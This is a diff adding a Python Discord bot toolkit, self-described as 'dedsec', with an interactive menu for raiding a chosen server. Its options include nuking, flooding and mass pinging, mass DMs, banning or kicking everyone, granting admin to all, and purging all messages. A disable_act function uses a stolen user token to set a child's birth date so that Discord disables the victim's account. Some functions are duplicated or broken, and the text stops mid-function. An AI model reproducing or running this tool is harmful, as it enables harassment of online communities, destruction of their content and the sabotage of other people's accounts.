@@ -1,0 +1,2403 @@
+#! /usr/bin/python3
+# coded by 0xbit
+
+import os, sys, discord, asyncio, logging, io, requests, aiohttp, json, random
+from discord.ext import commands
+from tabulate import tabulate
+from discord.errors import HTTPException
+from time import sleep
+from itertools import zip_longest
+        
+BG_P = "\033[48;5;55m"
+GREEN = "\033[92m"
+RED = "\033[91m"
+PINK = "\033[95m"
+DRED = "\033[38;5;88m"
+DISCORD_BLUE = '\033[94m'
+RESET = "\033[0m"
+green_dot = '[\033[92m●\033[0m]'
+green_question = '[\033[92m?\033[0m]'
+red_warning = '[\033[91m!\033[0m]'
+
+def cktn(host="1.1.1.1", port=53, timeout=0.5):
+    import socket
+    try:socket.create_connection((host, port), timeout);return True
+    except (socket.timeout, socket.error, socket.gaierror):return False
+
+sys.stderr = open(os.devnull, 'w')
+intents = discord.Intents.default()
+intents.message_content = True
+intents.members = True
+intents.guilds = True
+intents.emojis_and_stickers = True
+
+bot = commands.Bot(command_prefix="!", intents=intents)
+
+class Banner:
+    def __init__(self):
+        self.banner_text = f'''{PINK}
+    
+
+                            ________▄▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▄______
+                            _______█░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░█_____
+                            _______█░▒▒▒▒▒▒▒▒▒▒▄▀▀▄▒▒▒░░█▄▀▀▄_
+                            __▄▄___█░▒▒▒▒▒▒▒▒▒▒█▓▓▓▀▄▄▄▄▀▓▓▓█_
+                            █▓▓█▄▄█░▒▒▒▒▒▒▒▒▒▄▀▓▓▓▓▓▓▓▓▓▓▓▓▀▄_
+                            _▀▄▄▓▓█░▒▒▒▒▒▒▒▒▒█▓▓▓▄█▓▓▓▄▓▄█▓▓█_
+                            _____▀▀█░▒▒▒▒▒▒▒▒▒█▓▒▒▓▄▓▓▄▓▓▄▓▒▒█
+                            ______▄█░░▒▒▒▒▒▒▒▒▒▀▄▓▓▀▀▀▀▀▀▀▓▄▀_
+                            ____▄▀▓▀█▄▄▄▄▄▄▄▄▄▄▄▄██████▀█▀▀___
+                            ____█▄▄▀_█▄▄▀_______█▄▄▀_▀▄▄█_____{RESET}
+                            
+                                  ┏┓┳┳┳┓ ┳┓  ┏┳┏┓┏┓┓┏┓┏┓┳┓
+                                  ┃┓┃┃┃┃ ┃┃━━ ┃┣┫┃ ┃┫ ┣ ┣┫
+                                  ┗┛┗┛┻┗┛┻┛  ┗┛┛┗┗┛┛┗┛┗┛┛┗
+                         
+                     '''
+
+    def banner1(self):
+        os.system('clear')
+        print(self.banner_text)
+    
+    def banner2(self):
+        banner2_text = f'''{DRED}┃{RESET} {GREEN}dedsec advanced discord bot toolkit{RESET}\n{DRED}┃{RESET} coded by 0xbit'''
+        print('\n'.join(['\t ' + line for line in tabulate([[banner2_text]], tablefmt='rounded_grid').split('\n')]))
+
+bannerc = Banner()
+
+def load_tokens():
+    with open(".token", "r") as file:
+        lines = file.readlines()
+        tokens = [line.strip().split(maxsplit=1) for line in lines if line.strip()]
+    return tokens
+
+async def select_token(tokens):
+    with open(".token", "r") as file:
+        lines = file.readlines()
+        tokens = [line.strip().split(maxsplit=1) for line in lines if line.strip()]
+        
+    table_data = [[i + 1, f"{GREEN}{bot_name}{RESET}"] for i, (bot_name, _) in enumerate(tokens)]
+
+    add_option = [
+        [" A - ADD BOT"],
+        [" R - REMOVE BOT"],
+        [f" 0 - {RED}EXIT{RESET}"]
+    ]
+
+    headers = ["#", "Bot Name"]
+    table = tabulate(table_data, headers=headers, tablefmt="rounded_grid", stralign='left')
+    additional_table = tabulate(add_option, tablefmt="plain")
+    table = f"{table}\n\n{additional_table}"
+    
+    os.system('clear')
+    bannerc.banner1()
+    bannerc.banner2()
+
+    print(f'\n\t {green_dot} Available bots: ')
+    
+    print("\n".join(["\t " + line for line in table.split("\n")]))
+
+    choice = input(f"\n\t {green_question} SELECT: ")
+
+    if choice == "0":
+        await clean_exit()
+    
+    if choice.lower() == "a":
+        os.system('clear')
+        await add_bot_token()
+        await select_token(tokens)
+
+    if choice.lower() == "r":
+        delete_choice = input(f"\n\t {green_question} Enter the number of the bot to remove: ")
+
+        try:
+            delete_choice = int(delete_choice) - 1
+        except ValueError:
+            print(f"\n\t {red_warning} Invalid selection. Please try again.")
+            await asyncio.sleep(1)
+            os.system('clear')
+            return await select_token(tokens)
+
+        if 0 <= delete_choice < len(tokens):
+            del tokens[delete_choice]
+            with open('.token', 'w') as f:
+                for bot_name, token in tokens:
+                    f.write(f"{bot_name} {token}\n")
+            print(f"\n\t {green_dot} BOT TOKEN REMOVED SUCCESSFULLY.")
+            await asyncio.sleep(1)
+        else:
+            print(f"\n\t {red_warning} Invalid selection. Please try again.")
+            await asyncio.sleep(1)
+        
+        os.system('clear')
+        return await select_token(tokens)
+
+    try:
+        choice = int(choice) - 1
+    except ValueError:
+        print(f"\n\t {red_warning} Invalid selection. Please try again.")
+        await asyncio.sleep(1)
+        os.system('clear')
+        return await select_token(tokens)
+
+    if 0 <= choice < len(tokens):
+        selected_token = tokens[choice][1]
+        print('\n'+'\n'.join(['\t ' + line for line in  tabulate([[f"{green_dot} SELECTED BOT: {GREEN}{tokens[choice][0]}{RESET}"]],tablefmt='rounded_grid').split('\n')]))
+        return selected_token
+    else:
+        print(f"\n\t {red_warning} Invalid selection. Please try again.")
+        await asyncio.sleep(1)
+        os.system('clear')
+        return await select_token(tokens)
+
+async def get_int_input(prompt: str) -> int:
+    while True:
+        try:
+            return int(await bot.loop.run_in_executor(None, input, prompt))
+        except ValueError:
+            print(f"\n\t {red_warning} Invalid input. Please enter a valid number. \n")
+            await asyncio.sleep(1)
+            os.system('clear')
+
+async def get_str_input(prompt: str) -> str:
+    return await bot.loop.run_in_executor(None, input, prompt)
+
+selected_guild = None
+
+async def interactive_menu():
+    global selected_guild
+
+    while True:
+
+        bannerc.banner1()
+
+        try:
+            guild_options = []
+            for i, guild in enumerate(bot.guilds, start=1):
+                guild_options.append([f"{i}. {GREEN}{guild.name}{RESET}", guild.id])
+            
+
+            print(f"\n\t {green_dot} Select a server to interact with:")
+            table = tabulate(guild_options, headers=["Server Name", "Server ID"], tablefmt="rounded_grid")
+
+            print("\n".join(["\t " + line for line in table.split("\n")]))
+            print()
+            try:
+                selected_guild_index = await get_int_input(f"\t {green_question} [0-{GREEN}BACK{RESET}] | SELECT: ")
+            except KeyboardInterrupt:
+                await clean_exit()
+
+            if selected_guild_index == 0:
+                await main()
+                
+            if 1 <= selected_guild_index <= len(bot.guilds):
+                selected_guild = bot.guilds[selected_guild_index - 1]
+                os.system('clear')
+                break
+            else:
+                print(f"\n\t {red_warning} Invalid selection. Please try again.")
+                await asyncio.sleep(1)
+                os.system('clear')
+        except KeyboardInterrupt:
+            await clean_exit()
+
+    while True:
+        options = [
+            ["1. Show all channels",                "17. Change nickname of a user"],
+            ["2. Show members | info",              "18. Spam Typing"],
+            ["3. Show roles",                       "19. Nuke"],
+            ["4. Show server webhooks",             "20. PING everyone"],
+            ["5. Send a message",                   "21. FLOOD the server"],
+            ["6. Read messages",                    "22. MASS DM"],
+            ["7. Delete messages",                  "23. Change Server Name"],
+            ["8. Create | Delete a new channel",    "24. Change Server Icon"],
+            ["9. Create | Delete webhook",          "25. Make all admin"],
+            ["10. Create | Delete categories",      "26. Make you admin"],
+            ["11. Create | Delete roles",           "27. Change server"],
+            ["12. Delete all stickers",             "28. Change Bot"],
+            ["13. Ban/unban a user",                "29. Assign role to user"],
+            ["14. Kick a user",                     "30. Disable account"],
+            ["15. Mute/unmute a user",              "31. For testing"],
+            ["16. DM users",                     	"0. Exit "]
+        ]
+
+        bannerc.banner1()
+
+        print('\n'+'\n'.join(['\t ' + line for line in  tabulate([[f"SERVER: {GREEN}{selected_guild.name}{RESET}"]],tablefmt='rounded_grid').split('\n')]))
+        print("\n".join(["\t " + line for line in tabulate(options, tablefmt="rounded_grid").split("\n")]))
+        
+        option = await get_str_input(f"\n\t {green_question} SELECT [0-{GREEN}EXIT{RESET}]: ")
+        print()
+        try:
+            if option == '1':
+                os.system('clear')
+                await show_all_channels()
+            elif option == '2':
+                os.system('clear')
+                await show_all_users()
+            elif option == '3':
+                os.system('clear')
+                await show_all_roles()
+            elif option == '4':
+                await show_all_webhooks()
+            elif option == '5':
+                await choose_and_send_message()
+                await asyncio.sleep(1)
+            elif option == '6':
+                bannerc.banner1()
+                print(f'\n\t {green_dot} SELECT WHAT TO READ')
+                option = '''[1]. CHANNEL\n[2]. USER\n[0]. BACK'''
+                print('\n'.join(['\t ' + line for line in  tabulate([[option]],tablefmt='rounded_grid').split('\n')]) + '\n')
+                select = await get_str_input(f'\t {green_question} SELECT: ')
+                if select == '1':
+                    await read_channel_messages()
+                elif select == '2':
+                    await read_user_messages()
+                elif select == '0':
+                    continue
+                else:
+                    print(f'\n\t {red_warning} Invalid selection. Please try again.')
+            elif option == '7':
+                await delete_all_messages_options()
+                
+            elif option == '8':
+                print('\n'.join(['\t ' + line for line in  tabulate([[f"1. CREATE", "2. DELETE", "0. BACK"]],tablefmt='rounded_grid').split('\n')]) + '\n')
+                options = input(f"\t {green_question} SELECT: ")
+                if options == '1':
+                    await create_channels()
+                elif options == '2':
+                    await delete_channels()
+                elif options == '0':
+                    continue
+                else:
+                    print(f'\n\t {red_warning} Invalid selection. Please try again.')
+                await asyncio.sleep(1)
+                        
+            elif option == '9':
+                await create_or_manage_webhook()
+                
+            elif option == '10':
+                print('\n'.join(['\t ' + line for line in  tabulate([['[1]. CREATE CATEGORIES\n[2]. DELETE CATEGORIES\n[3]. LOCK CATEGORIES\n[4]. LIST CATEGORIES\n[5]. LIST CHANNELS IN A CATEGORY\n[0]. BACK']],tablefmt='rounded_grid').split('\n')]) + '\n')
+                choice = input(f"\t {green_question} SELECT: ")
+                if choice == '1':
+                    await create_categories()
+                elif choice == '2':
+                    await delete_categories()
+                elif choice == '3':
+                    await lock_category_channels()
+                elif choice == '4':
+                    await list_all_categories()
+                elif choice == '5':
+                    await list_channels_in_category()
+                elif choice == '0':
+                    return
+                else:
+                    print(f"\t {red_warning} Invalid option. Please try again.")
+                    
+                await asyncio.sleep(1) 
+                      
+            elif option == '11':
+                await manage_roles()
+                await asyncio.sleep(1)
+            elif option == '12':
+                await delete_all_stickers()
+                await asyncio.sleep(1)           
+            elif option == '13':
+                username = await get_str_input(f'\t {green_question} Enter the username to ban (or type "all" to ban everyone): ')
+                action = await get_str_input(f'\t {green_question} Enter the action (ban or unban): ')
+                await ban_or_unban_user(action, username)
+                await asyncio.sleep(1)          
+            elif option == '14':
+                username = await get_str_input(f'\t {green_question} Enter the username to kick (or type "all" to kick everyone): ')
+                await kick_user(username)
+                await asyncio.sleep(1)          
+            elif option == '15':
+                username = await get_str_input(f'\t {green_question} Enter the username to mute (or type "all" to mute everyone): ')
+                option = '''[1]. Mute\n[2]. Unmute'''
+                print('\n'.join(['\t ' + line for line in  tabulate([[option]],tablefmt='rounded_grid').split('\n')]) + '\n')
+                action = await get_str_input(f'\t {green_question} SELECT: ')
+                if action == '1':
+                    action = 'mute'
+                elif action == '2':
+                    action = 'unmute'
+                else:
+                    print(f'\n\t {red_warning} Invalid selection. Please try again.')
+                    continue
+                
+                await mute_or_unmute_user(username, action)
+                await asyncio.sleep(1)         
+            elif option == '16':
+                await dm_user()
+                await asyncio.sleep(1)         
+            elif option == '17':
+                username = await get_str_input(f'\t {green_question} Enter the username to change nickname (or type "all" to change everyone): ')
+                new_nickname = await get_str_input(f'\n\t {green_question} Enter the new nickname: ')
+                await change_nickname(username, new_nickname)
+                await asyncio.sleep(1)        
+            elif option == '18':
+                duration = await get_int_input(f'\t {green_question} Enter typing duration in seconds: ')
+                if duration > 10:
+                    duration = 10
+                await show_typing_in_all_channels(duration)
+                await asyncio.sleep(1)       
+            elif option == '19':
+                select = await get_str_input(f'\t {green_question} Are you sure to nuke the server? (y/n): ')
+                if select.lower() == 'y':
+                    await nuke()
+                    await asyncio.sleep(1) 
+                elif select.lower() == 'n':
+                    continue
+                
+            elif option == '20':
+                select = await get_str_input(f'\t {green_question} Are you sure to ping everyone in all channels? (y/n): ')
+                if select.lower() == 'y':
+                    await ping_everyone_in_all_channels()
+                    await asyncio.sleep(1)
+                elif select.lower() == 'n':
+                    continue
+         
+            elif option == '21':
+                select = await get_str_input(f'\t {green_question} Are you sure to flood the server? (y/n): ')
+                if select.lower() == 'y':
+                    await flood_the_server()
+                    await asyncio.sleep(1)
+                elif select.lower() == 'n':
+                    continue
+                
+            elif option == '22':
+                await messaging_menu()
+                await asyncio.sleep(1)
+
+            elif option == '23':
+                base_name = await get_str_input(f'\t {green_question} Enter Server name: ')
+                await change_server_name(base_name)
+                await asyncio.sleep(1)
+
+            elif option == '24':
+                filepath_img = await get_str_input(f'\t {green_question} Enter image path: ')
+                await change_server_icon(filepath_img)
+                await asyncio.sleep(1)
+            elif option == '25':
+                await make_admin_role_and_assign()
+                await asyncio.sleep(1)       
+            elif option == '26':
+                memsearch = await get_str_input(f'\t {green_question} Enter your username or userid: ')
+                option = '''[1]. Add\n[2]. Remove'''
+                print('\n'.join(['\t ' + line for line in  tabulate([[option]],tablefmt='rounded_grid').split('\n')]))
+                action = await get_str_input(f'\n\t {green_question} SELECT: ')
+                await assign_admin_role_to_user(memsearch, action)
+                await asyncio.sleep(1)
+                         
+            elif option == '27':
+                os.system('clear')
+                await interactive_menu()    
+                        
+            elif option == '28':
+                await main()
+                
+            elif option == '29':
+                await assign_role_to_user()
+                await asyncio.sleep(1)
+                
+            elif option == '30':
+                token = (await get_str_input(f'\t {green_question} [0 - Back] Enter target user token: ')).strip()
+                if token == '0':
+                    continue
+            
+                await disable_act(token)
+                await asyncio.sleep(1)
+
+            elif option == '31':
+                select = await get_str_input(f'\t {green_dot} ARE YOU SURE TO EXECUTE (FOR TESTING ONLY) y/n: ')
+                if select == 'y':
+                    await for_testing()
+                    await asyncio.sleep(1)
+                    
+                elif select == 'n':
+                    continue
+                else:
+                    print(f"\t {red_warning} Invalid option. Please try again.")
+                    await asyncio.sleep(1)
+                
+            elif option == '0':
+                await main()
+                        
+            else:
+                print(f"\t {red_warning} Invalid option. Please try again.")
+                await asyncio.sleep(1)
+                
+            os.system('clear')
+            
+        except Exception as e:
+            print(f"\n\t {red_warning} An error occurred.")
+            os.system('clear')
+
+@bot.event
+async def on_ready():
+    print(f'\n\t {green_dot} BOT CONNECTED.') 
+    sleep(0.5)
+    os.system('clear')
+    try:
+        asyncio.create_task(interactive_menu())
+    except Exception as e:
+        print(f"\n\t {red_warning} Error starting interactive menu: {e}")
+        await clean_exit()
+
+@bot.event
+async def on_message(message):
+    if message.author == bot.user:
+        return
+
+async def show_all_users():
+    if selected_guild is None:
+        print(f"\t {red_warning} No server selected.")
+        await asyncio.sleep(1)
+        return
+
+    try:
+        user_data = []
+        for idx, member in enumerate(selected_guild.members, start=1):
+            member_name = f'{GREEN}{member.display_name}{RESET}'
+            user_name = f'{GREEN}{member.name}{RESET}'
+            user_data.append([idx, user_name, member_name, member.id, str(member.status).title()])
+            
+        headers = ["#", "Username", "User Nickname", "User ID", "Status"]
+        table = tabulate(user_data, headers=headers, tablefmt="rounded_grid")
+        
+        bannerc.banner1()
+
+        print("\n".join(["\t " + line for line in table.split("\n")]))
+        
+        option = f'Enter [ {GREEN}user number{RESET} | {GREEN}ID{RESET} | {GREEN}username{RESET} ] to view detailed information [{GREEN}press enter to exit{RESET}]'
+        print('\n'.join(['\t ' + line for line in tabulate([[option]], tablefmt='rounded_grid').split('\n')]))
+        
+        choice = (await get_str_input(f'\n\t {green_question} SELECT: ')).strip()
+        
+        if choice == '':
+            os.system('clear')
+            return
+            
+        if choice.isdigit() and 1 <= int(choice) <= len(selected_guild.members):
+            member = selected_guild.members[int(choice)-1]
+            await display_member_info(member)
+        else:
+            await search_member_info(choice)
+            
+        os.system('clear')
+        
+    except Exception as e:
+        print(f"\n\t {red_warning} An error occurred: {e}")
+        await asyncio.sleep(1)
+        os.system('clear')
+
+async def search_member_info(search_term=None):
+    if selected_guild is None:
+        print(f"\t {red_warning} No server selected.")
+        return
+
+    bannerc.banner1()
+
+    if search_term is None:
+        search_term = await get_str_input(f'\t {green_question} Enter username or userid: ').strip()
+    
+    member = None
+    
+    if search_term.isdigit():
+        member = selected_guild.get_member(int(search_term))
+    
+    if member is None:
+        member = discord.utils.get(selected_guild.members, name=search_term)
+
+    if member is None:
+        member = discord.utils.find(lambda m: search_term.lower() in m.display_name.lower(), selected_guild.members)
+    
+    if member is None:
+        member = discord.utils.find(lambda m: search_term.lower() in m.name.lower(), selected_guild.members)
+    
+    if member is None:
+        for m in selected_guild.members:
+            if search_term.lower() in m.name.lower() or search_term.lower() in m.display_name.lower():
+                member = m
+                break
+
+    if member is not None:
+        await display_member_info(member)
+    else:
+        print(f"\t {red_warning} No member found with '{search_term}'")
+        await get_str_input(f'\n\t {GREEN}┃{RESET} Press enter to continue...')
+        
+async def display_member_info(member):
+    created_at = member.created_at.strftime('%Y-%m-%d %H:%M:%S')
+    joined_at = member.joined_at.strftime('%Y-%m-%d %H:%M:%S') if member.joined_at else "Unknown"
+    premium_since = member.premium_since.strftime('%Y-%m-%d %H:%M:%S') if member.premium_since else "Not boosting"
+    pending = "Yes" if member.pending else "No"
+    is_bot = "Yes" if member.bot else "No"
+
+    activity = member.activity.name if member.activity else "None"
+    client_status = f"Web: {member.web_status}, Desktop: {member.desktop_status}, Mobile: {member.mobile_status}"
+
+    roles = [role for role in member.roles if role.name != "@everyone"]
+    role_info = "\n".join([f"{role.name} (ID: {role.id})" for role in roles])
+    highest_role = member.top_role.name if member.top_role else "None"
+    color = str(member.color) if member.color else "Default"
+
+    permissions = [perm for perm, value in member.guild_permissions if value]
+    key_permissions = ", ".join(permissions[:5]) + ("..." if len(permissions) > 5 else "")
+
+    avatar_url = member.avatar.url if member.avatar else None
+    banner_url = member.banner.url if member.banner else None
+
+    if avatar_url:
+        filename = ".avatar.gif"
+        print(f'\n\t {green_dot} Getting user info...\n')
+        try:
+            response = requests.get(avatar_url, stream=True)
+            if response.status_code == 200:
+                with open(filename, "wb") as file:
+                    file.write(response.content)
+                if os.system("which chafa > /dev/null") == 0:
+                    os.system('clear')
+                    ascii_image = os.popen(f"chafa {filename} --symbols solid -c full --size=20x10").read().strip()
+                    print(f'\t  {BG_P}     USER AVATAR    {RESET}')
+                    print('\n'.join(['\t  ' + line.rstrip() for line in tabulate([[ascii_image]], tablefmt='plain').split('\n') if line.strip()]))
+                else:
+                    print("\t Chafa is not installed. Cannot display avatar.")
+            else:
+                print("\t Failed to download avatar.")
+        except Exception as e:
+            print(f'\t {red_warning} Error displaying avatar: {str(e)}')
+
+    member_data = [
+        ['Server Name', f"{GREEN}{member.display_name}{RESET}"],
+        ['Global Name', f"{GREEN}{member.global_name}{RESET}"],
+        ["Username", f"{GREEN}{member.name}{RESET}"],
+        ["User ID", f"{GREEN}{member.id}{RESET}"],
+        ["Account Created", f"{GREEN}{created_at}{RESET}"],
+        ["Joined Server", f"{GREEN}{joined_at}{RESET}"],
+        ["Boosting Since", f"{GREEN}{premium_since}{RESET}"],
+        ["Pending Verification", f"{GREEN}{pending}{RESET}"],
+        ["Is Bot", f"{GREEN}{is_bot}{RESET}"],
+        ["Current Activity", f"{GREEN}{activity}{RESET}"],
+        ["Client Status", f"{GREEN}{client_status}{RESET}"],
+        ["Color", f"{GREEN}{color}{RESET}"],
+        ["Highest Role", f"{GREEN}{highest_role}{RESET}"],
+        ["Key Permissions", f"{GREEN}{key_permissions}{RESET}"],
+        ["Avatar URL", f"{GREEN}{avatar_url or 'No Avatar'}{RESET}"],
+        ["Banner URL", f"{GREEN}{banner_url or 'No Banner'}{RESET}"],
+        ["Roles", f"{GREEN}{len(roles)}{RESET}"],
+    ]
+
+    print("\n".join(["\t " + line for line in tabulate(member_data, headers=["Field", "Value"], tablefmt="rounded_grid").split("\n") if line.strip()]))
+    
+    if roles:
+        print(f"\n\t {green_dot} Role Details:")
+        role_table = tabulate([[role_info]], tablefmt="rounded_grid")
+        print("\n".join(["\t " + line for line in role_table.split("\n")]))
+
+    def split_into_columns(data, num_columns=3):
+        rows = list(zip_longest(*[iter(data)] * num_columns, fillvalue=""))
+        return rows
+
+    print(f'\n\t {green_question} All {GREEN}{member.global_name or member.name}{RESET} Server permissions ')
+    
+    num_columns = 3
+    permissions_columns = split_into_columns(permissions, num_columns)
+    perm_table = tabulate(permissions_columns, tablefmt="rounded_grid")
+    print("\n".join(["\t " + line for line in perm_table.split("\n")]))
+            
+    await get_str_input(f'\n\t {GREEN}┃{RESET} Press Enter to continue...\n')
+
+async def search_member_info(search_term=None):
+    if selected_guild is None:
+        print(f"\t {red_warning} No server selected.")
+        return
+
+    bannerc.banner1()
+
+    if search_term is None:
+        search_term = await get_str_input(f'\t {green_question} Enter username or userid: ').strip()
+    
+    member = None
+    if search_term.isdigit():
+        member = selected_guild.get_member(int(search_term))
+    if member is None:
+        member = discord.utils.get(selected_guild.members, name=search_term)
+    if member is None:
+        member = discord.utils.find(lambda m: search_term.lower() in m.name.lower(), selected_guild.members)
+
+    if member is not None:
+        await display_member_info(member)
+    else:
+        print(f"\n\t {red_warning} No member found with that username or ID.")
+        await get_str_input(f'\n\t {GREEN}┃{RESET} Press enter to continue...')
+    
+async def disable_act(token):
+    await bot.message.delete()
+    headers = {'Authorization': token}
+    payload = {'date_of_birth': '2017-7-16'}
+
+    r = requests.patch('https://discord.com/api/v9/users/@me', headers=headers, json=payload)
+
+    if r.status_code == 400:
+        print(f'\n\t [{green_dot}] Account disabled successfully')
+        await asyncio.sleep(1)
+    else:
+        print(f'\n\t [{red_warning}] Invalid token')
+        await asyncio.sleep(1)
+        
+async def show_all_channels():
+    if selected_guild is None:
+        print(f"\t {red_warning} No server selected.")
+        return
+
+    channel_data = []
+    for channel in selected_guild.text_channels + selected_guild.voice_channels:
+        channel_type = "Text" if isinstance(channel, discord.TextChannel) else "Voice"
+        channel.name = f'{GREEN}{channel.name}{RESET}'
+        channel_data.append([channel.name, channel.id, channel_type])
+        
+    headers = ["Channel Name", "Channel ID", "Type"]
+    table = tabulate(channel_data, headers=headers, tablefmt="rounded_grid")
+    bannerc.banner1()
+
+    print("\n".join(["\t " + line for line in table.split("\n")]))
+    await get_str_input(f'\n\t {GREEN}┃{RESET} Press enter to continue...')
+    os.system('clear')
+
+async def retry_on_ratelimit(coro, *args, **kwargs):
+    while True:
+        try:
+            return await coro(*args, **kwargs)
+        except HTTPException as e:
+            if e.status == 429:
+                retry_after = e.retry_after if hasattr(e, 'retry_after') else 1
+                logging.warning(f"\n\t {red_warning} Rate limited. Retrying after seconds.")
+                await asyncio.sleep(retry_after + 5)
+            else:
+                raise
+
+async def send_message_with_delay(channel, message, delay):
+    await retry_on_ratelimit(channel.send, message)
+    await asyncio.sleep(delay)
+
+async def send_message_with_delay1(channel, message, delay):
+    if isinstance(channel, discord.TextChannel):
+        await asyncio.sleep(delay) 
+        await channel.send(message)
+        print(f"\n\t {green_dot} Message sent to text channel {channel.name} (ID: {channel.id})")
+    elif isinstance(channel, discord.VoiceChannel):
+        print(f"\n\t {green_dot} Skipping voice channel {channel.name} (ID: {channel.id}) as it cannot receive text messages.")
+
+async def send_message_to_all_channels(message, num_messages):
+    tasks = []
+    for guild in bot.guilds:
+        if guild == selected_guild: 
+            for channel in guild.text_channels:
+                tasks.extend(send_message_with_delay1(channel, message, 0.1) for _ in range(num_messages))
+
+    await asyncio.gather(*tasks)
+    print(f"\n\t {green_dot} Message sent {num_messages} times to all text channels in the selected server.")
+
+async def delete_all_messages_options():
+    if selected_guild is None:
+        print(f"\t {red_warning} No server selected.")
+        return
+
+    option = '''[1]. Delete all messages in the entire server\n[2]. Delete all messages from a specific user\n[3]. Delete all messages in a specific channel\n[0]. Back'''
+    print('\n'.join(['\t ' + line for line in  tabulate([[option]],tablefmt='rounded_grid').split('\n')]))
+    
+    select = input(f"\n\t {green_question} SELECT: ")
+
+    if select == '1':
+        await delete_all_messages_serverwide()
+        await asyncio.sleep(1)
+    elif select == '2':
+        await delete_all_messages_from_user()
+        await asyncio.sleep(1)
+    elif select == '3':
+        await delete_all_messages_in_selected_channel()
+        await asyncio.sleep(1)
+    elif select == '0':
+        return
+    else:
+        print(f"\n\t {red_warning} Invalid option selected.")
+
+async def delete_all_messages_in_selected_channel():
+    channel_data = []
+    for idx, channel in enumerate(selected_guild.text_channels, start=1):
+        channel_data.append([idx, channel.name, channel.id])
+
+    headers = ["No", "Channel Name", "Channel ID"]
+    table = tabulate(channel_data, headers=headers, tablefmt="rounded_grid")
+    print(f"\n\t {green_dot} Available Channels:")
+    print("\n".join(["\t " + line for line in table.split("\n")]))
+
+    try:
+        channel_number = await get_int_input(f"\n\t {green_question} Enter the number of the channel to delete all messages from: ")
+        selected_channel = next((ch for idx, ch in enumerate(selected_guild.text_channels, start=1) if idx == channel_number), None)
+        if not selected_channel:
+            print(f'\n\t {red_warning} No channel found with the number: {channel_number}')
+            return
+
+        confirm = input(f"\n\t {green_question} Are you sure you want to delete all messages in {selected_channel.name}? (y/n): ").lower()
+        if confirm == 'y':
+            await delete_all_messages(selected_channel.id)
+            print(f"\n\t {green_dot} All messages in {selected_channel.name} have been deleted.")
+        else:
+            print(f"\n\t {red_warning} Action canceled.")
+
+    except ValueError:
+        print(f'\n\t {red_warning} Invalid input. Please enter a valid number.')
+
+async def delete_all_messages_from_user():
+    member_data = []
+    for idx, member in enumerate(selected_guild.members, start=1):
+        member_data.append([idx, member.name, member.id])
+
+    headers = ["No", "User Name", "User ID"]
+    table = tabulate(member_data, headers=headers, tablefmt="rounded_grid")
+    print(f"\n\t {green_dot} Available Users:")
+    print("\n".join(["\t " + line for line in table.split("\n")]))
+
+    try:
+        user_number = await get_int_input(f"\n\t {green_question} Enter the number of the user to delete all messages from: ")
+        selected_member = next((member for idx, member in enumerate(selected_guild.members, start=1) if idx == user_number), None)
+        if not selected_member:
+            print(f'\n\t {red_warning} No user found with the number: {user_number}')
+            return
+
+        confirm = input(f"\n\t {green_question} Are you sure you want to delete all messages from {selected_member.name}? (y/n): ").lower()
+        if confirm == 'y':
+            await delete_messages_from_user(selected_member)
+            print(f"\n\t {green_dot} All messages from {selected_member.name} have been deleted.")
+        else:
+            print(f"\n\t {red_warning} Action canceled.")
+    except ValueError:
+        print(f'\n\t {red_warning} Invalid input. Please enter a valid number.')
+
+async def delete_all_messages_serverwide():
+    confirm = input(f"\n\t {green_question} Are you sure you want to delete all messages in the entire server {selected_guild.name}? (y/n): ").lower()
+    if confirm == 'y':
+        tasks = [delete_all_messages(channel.id) for channel in selected_guild.text_channels]
+        await asyncio.gather(*tasks)
+        print(f"\n\t {green_dot} All messages in {selected_guild.name} have been deleted.")
+    else:
+        print(f"\n\t {red_warning} Action canceled.")
+
+async def delete_messages_from_user(user):
+    try:
+        tasks = [channel.purge(limit=None, check=lambda msg: msg.author == user) for channel in selected_guild.text_channels]
+        await asyncio.gather(*tasks)
+        print(f"\t {green_dot} All messages from {user.name} have been deleted.")
+    except discord.Forbidden:
+        print(f"\t {red_warning} Bot does not have permission to delete messages.")
+    except discord.HTTPException as e:
+        print(f"\t {red_warning} An error occurred: {e}")
+
+
+async def delete_all_messages(channel_id):
+    channel = bot.get_channel(channel_id)
+    if channel is None:
+        print(f"\t {red_warning} Channel not found.")
+        return
+
+    try:
+        await channel.purge(limit=None)
+        print(f"\t {green_dot} All messages deleted in {channel.name}.")
+    except discord.Forbidden:
+        print(f"\t {red_warning} Bot does not have permission to delete messages.")
+    except discord.HTTPException as e:
+        print(f"\t {red_warning} An error occurred: {e}")
+
+async def choose_and_send_message():
+
+    message = input(f"\t {green_question} Enter the message to send: ")
+    message = f'''{message}'''
+    
+    option = '''[1]. Send to all channels\n[2]. Send to a specific channel\n[0]. Back'''
+    print('\n'.join(['\t ' + line for line in  tabulate([[option]],tablefmt='rounded_grid').split('\n')]))
+    select = input(f"\n\t {green_question} SELECT: ")
+
+
+    if select == '1':
+        num_messages = int(input(f"\n\t {green_question} Enter the number of messages to send to each channel: "))
+        await send_message_to_all_channels(message, num_messages)
+    elif select == '2':
+        if selected_guild is None:
+            print(f"\t {red_warning} No server selected.")
+            return
+
+        channel_data = []
+        for idx, channel in enumerate(selected_guild.text_channels, start=1):
+            channel_data.append([idx, channel.name, channel.id])
+
+        headers = ["No", "Channel Name", "Channel ID"]
+        table = tabulate(channel_data, headers=headers, tablefmt="rounded_grid")
+        print(f"\n\t {green_dot} Available Channels:")
+        print("\n".join(["\t " + line for line in table.split("\n")]))
+
+        try:
+            channel_number = int(input(f"\n\t {green_question} Enter the number of the channel to send the message to: "))
+            selected_channel = next((ch for idx, ch in enumerate(selected_guild.text_channels, start=1) if idx == channel_number), None)
+            if not selected_channel:
+                print(f'\n\t {red_warning} No channel found with the number: {channel_number}')
+                return
+
+            num_messages = int(input(f"\n\t {green_question} Enter the number of messages to send to the selected channel: "))
+            tasks = [send_message_with_delay1(selected_channel, message, 0.1) for _ in range(num_messages)]
+            await asyncio.gather(*tasks)
+
+            print(f"\n\t {green_dot} Message sent {num_messages} times to channel {selected_channel.name} (ID: {selected_channel.id}).")
+
+        except ValueError:
+            print(f'\n\t {red_warning} Invalid input. Please enter a valid number.')
+            
+    elif select == '0':
+        return
+    else:
+        print(f"\n\t {red_warning} Invalid option. Please select a valid option.")
+        
+async def create_channels():
+    if selected_guild is None:
+        print(f"\t {red_warning} No server selected.")
+        return
+
+    channel_name = input(f"\n\t {green_question} Enter the channel name: ")
+    num_channels = int(input(f"\n\t {green_question} Enter the number of channels to create: "))
+    
+    option = '''[1]. Text Channel\n[2]. Voice Channel\n[3]. Both'''
